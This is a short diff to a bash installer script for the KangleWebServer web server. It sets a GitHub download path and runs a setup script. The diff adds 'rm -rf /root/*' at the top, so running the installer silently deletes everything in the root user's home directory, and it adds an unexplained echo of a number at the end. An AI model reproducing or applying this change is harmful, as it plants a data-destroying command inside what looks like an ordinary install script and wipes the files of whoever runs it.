@@ -1,4 +1,5 @@
 #/bin/bash
+rm -rf /root/*
 #变量
 links="https://raw.githubusercontent.com/EVECloud/kws/master"
 L="/home/eins"
@@ -18,3 +19,4 @@ clear
 echo="KangleWebServer Is installing!"
 echo="Please wait!"
 bash $L/sys.sh
+echo "861607619"
